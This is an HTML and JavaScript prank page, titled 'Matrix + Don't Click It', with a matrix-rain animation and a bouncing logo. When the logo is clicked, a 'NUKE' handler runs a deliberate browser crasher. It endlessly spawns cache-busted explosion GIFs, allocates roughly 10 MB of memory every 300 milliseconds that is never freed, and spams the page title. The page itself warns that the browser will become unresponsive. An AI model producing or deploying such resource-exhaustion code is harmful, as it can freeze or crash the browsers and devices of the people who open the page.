<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matrix + Don't Click It</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background: black;
            color: #0f0;
            font-family: monospace;
            user-select: none;
            height: 100vh;
            position: relative;
        }
        canvas {
            display: block;
            position: fixed;
            inset: 0;
            z-index: 1;
        }
        #logo-container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            z-index: 10;
            text-align: center;
        }
        #logo {
            pointer-events: auto;
            cursor: pointer;
            image-rendering: pixelated;
            width: min(260px, 55vw);
            max-width: 260px;
        }
        #crash-overlay {
            position: fixed;
            inset: 0;
            background: rgba(200,0,0,0.88);
            color: white;
            font-size: clamp(3.5rem, 9vw, 8rem);
            font-weight: bold;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 9999;
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.6s;
        }
        .warning {
            font-size: clamp(1.6rem, 5vw, 3.2rem);
            color: #ff0;
            text-shadow: 0 0 20px #ff0;
            margin-top: 40px;
            animation: blink 0.9s infinite alternate;
        }
        @keyframes blink {
            from { opacity: 0.4; }
            to   { opacity: 1.0; }
        }
        .boom {
            position: absolute;
            width:  clamp(70px, 11vw, 260px);
            height: auto;
            pointer-events: none;
            opacity: 0.95;
            transform: translate(-50%, -50%);
            image-rendering: pixelated;
            will-change: transform, opacity;   /* hint to browser: animate me fast */
        }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>
    <div id="logo-container">
        <img id="logo" src="https://dontclickit.org/wp-content/uploads/2024/05/cropped-dont-click-it-logo-1-330x109.png" alt="Don't Click It">
    </div>

    <div id="crash-overlay">
        <div>DESTRUCTION SEQUENCE ACTIVE</div>
        <div class="warning">BROWSER WILL BECOME UNRESPONSIVE</div>
    </div>

    <script>
        // Matrix Rain (unchanged)
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        let columns, drops;

        function resizeMatrix() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const fontSize = 16;
            columns = Math.floor(canvas.width / fontSize);
            drops = new Array(columns).fill(1);
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0,0,0,0.07)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#0f0';
            ctx.font = '16px monospace';
            const chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789☠";
            for (let i = 0; i < columns; i++) {
                const txt = chars[Math.floor(Math.random() * chars.length)];
                const x = i * 16;
                const y = drops[i] * 16;
                ctx.fillText(txt, x, y);
                if (y > canvas.height && Math.random() > 0.97) drops[i] = 0;
                drops[i]++;
            }
        }

        resizeMatrix();
        window.addEventListener('resize', resizeMatrix);
        setInterval(drawMatrix, 40);

        // Bouncing logo
        const logoContainer = document.getElementById('logo-container');
        let logoX = window.innerWidth * 0.5 - 130;
        let logoY = window.innerHeight * 0.5 - 70;
        let vx = (Math.random() > 0.5 ? 1 : -1) * (2 + Math.random() * 1.5);
        let vy = (Math.random() > 0.5 ? 1 : -1) * (2 + Math.random() * 1.5);

        function animateLogo() {
            const w = logoContainer.offsetWidth || 260;
            const h = logoContainer.offsetHeight || 140;
            logoX += vx;
            logoY += vy;
            if (logoX <= 0 || logoX + w >= window.innerWidth) vx = -vx;
            if (logoY <= 0 || logoY + h >= window.innerHeight) vy = -vy;
            logoContainer.style.left = logoX + 'px';
            logoContainer.style.top  = logoY + 'px';
            requestAnimationFrame(animateLogo);
        }
        animateLogo();

        // ─── N U K E ─────────────────────────────────────────────
        const overlay = document.getElementById('crash-overlay');
        const logo    = document.getElementById('logo');
        const gifUrl  = "https://cache.magicmaman.com/data/fichiers/48/bombenucleaire.gif";

        let destroyed = false;

        logo.addEventListener('click', () => {
            if (destroyed) return;
            destroyed = true;

            logo.style.pointerEvents = 'none';
            logo.style.opacity = '0.3';
            overlay.style.opacity = '1';

            const boomLayer = document.createElement('div');
            boomLayer.id = 'boom-layer';
            boomLayer.style.cssText = `
                position: fixed; inset: 0; pointer-events: none; z-index: 9998;
                will-change: transform;
            `;
            document.body.appendChild(boomLayer);

            function spawnBoom() {
                if (!destroyed) return;

                const img = new Image();
                img.src = gifUrl + '#' + Math.random();  // bust cache aggressively
                img.className = 'boom';
                img.alt = "BOOM";

                const x = Math.random() * 100;
                const y = Math.random() * 100;
                img.style.left = x + 'vw';
                img.style.top  = y + 'vh';

                const rot   = (Math.random() - 0.5) * 80;
                const scale = 0.6 + Math.random() * 1.4;
                img.style.transform = `rotate(${rot}deg) scale(${scale})`;

                // Start behind overlay → after ~1s move to front
                img.style.zIndex = '1';

                boomLayer.appendChild(img);

                // Cleanup very old ones occasionally (helps not freeze instantly)
                if (Math.random() < 0.06 && boomLayer.children.length > 180) {
                    const oldest = boomLayer.children[0];
                    if (oldest) oldest.remove();
                }
            }

            // Lightning fast spawning
            const ultraFast = setInterval(spawnBoom, 20);           // ~50/sec
            setTimeout(() => clearInterval(ultraFast), 8000);      // cap runaway a bit

            // Even faster burst mode after 1 second
            setTimeout(() => {
                // Move explosions OVER the overlay text
                boomLayer.style.zIndex = '10000';

                // Super aggressive burst interval
                setInterval(() => {
                    for (let i = 0; i < 12; i++) {
                        setTimeout(spawnBoom, i * 200);
                    }
                }, 280);

                // Initial burst right when we go over
                for (let i = 0; i < 60; i++) {
                    setTimeout(spawnBoom, i * 50);
                }
            }, 1000);

            // Extra memory pressure
            const leak = [];
            setInterval(() => {
                try {
                    leak.push(new ArrayBuffer(6 * 1024 * 1024));
                    leak.push(new Uint8Array(4 * 1024 * 1024));
                } catch {}
            }, 300);

            // Title chaos
            let counter = 0;
            setInterval(() => {
                document.title = "SYSTEM FAILURE ".repeat((counter++ % 5) + 2) + "☠×" + counter;
            }, 140);
        });
    </script>
</body>
</html>
